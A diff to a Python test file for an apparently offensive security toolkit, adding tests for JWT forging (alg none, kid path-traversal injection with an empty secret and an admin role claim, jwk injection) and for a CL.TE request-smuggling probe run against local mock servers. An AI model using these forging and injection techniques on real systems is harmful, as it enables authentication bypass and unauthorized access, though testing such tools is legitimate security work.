@@ -3270,6 +3270,19 @@ async def test_offensive_arsenal():
     none_tok = await jt.execute(action="forge", token=tok, alg_none=True)
     assert "none" in none_tok.output.lower()
 
+    # Header injection: kid path-traversal token is HMAC-signed (no crypto dep). Parse it
+    # back with the tool to confirm the kid landed in the header and it's a valid 3-part JWT.
+    kidt = await jt.execute(action="kid_inject", token=tok, claims={"role": "admin"},
+                            kid="../../../../dev/null", secret="")
+    assert kidt.success and kidt.metadata.get("kid") == "../../../../dev/null"
+    forged_tok = kidt.output.splitlines()[1].strip()
+    assert forged_tok.count(".") == 2
+    parsed = await jt.execute(action="parse", token=forged_tok)
+    assert "../../../../dev/null" in parsed.output and "HS256" in parsed.output
+    # jwk/jku need the optional cryptography package - they must fail cleanly, not crash.
+    jwkt = await jt.execute(action="jwk_inject", token=tok)
+    assert jwkt.success or "cryptography" in (jwkt.error or "")
+
     # GraphQL analyze flags ID-shaped args as IDOR candidates.
     schema = {"queryType": {"name": "Query"}, "mutationType": None,
               "types": [{"name": "Query", "fields": [
@@ -3372,9 +3385,51 @@ async def test_advanced_web_weapons():
     finally:
         wa.HttpClient = orig
 
+    # Request smuggling: a back-end that HANGS on the CL.TE probe (as if waiting for a
+    # chunk terminator) is flagged; a clean server is not. Uses a real local socket.
+    import asyncio as _asyncio
+
+    async def _hang_handler(reader, writer):
+        text = (await reader.read(300)).decode("latin-1", "ignore")
+        if ("Transfer-Encoding: chunked" in text and "Content-Length: 4" in text
+                and "xchunked" not in text):
+            await _asyncio.sleep(30)   # CL.TE probe -> hang past the wait cap
+        try:
+            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi")
+            await writer.drain()
+            writer.close()
+        except Exception:
+            pass
+
+    srv = await _asyncio.start_server(_hang_handler, "127.0.0.1", 0)
+    port = srv.sockets[0].getsockname()[1]
+    async with srv:
+        tool = wa.SmuggleProbeTool()
+        tool._WAIT = 2.0
+        r = await tool.execute(url=f"http://127.0.0.1:{port}/")
+        assert "CL.TE" in r.metadata.get("vulnerable", []), r.output
+
+    async def _clean_handler(reader, writer):
+        await reader.read(300)
+        try:
+            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi")
+            await writer.drain()
+            writer.close()
+        except Exception:
+            pass
+
+    srv2 = await _asyncio.start_server(_clean_handler, "127.0.0.1", 0)
+    port2 = srv2.sockets[0].getsockname()[1]
+    async with srv2:
+        tool = wa.SmuggleProbeTool()
+        tool._WAIT = 2.0
+        r2 = await tool.execute(url=f"http://127.0.0.1:{port2}/")
+        assert r2.metadata.get("vulnerable") == []
+
     # Wired into the web operator.
     web = get_operator("web_operator")
-    assert {"ssrf_probe", "cors_audit", "ssti_probe", "nosqli_probe"} <= set(web.tools)
+    assert {"ssrf_probe", "cors_audit", "ssti_probe", "nosqli_probe",
+            "smuggle_probe"} <= set(web.tools)
     print("  PASS  advanced_web_weapons")
 
 
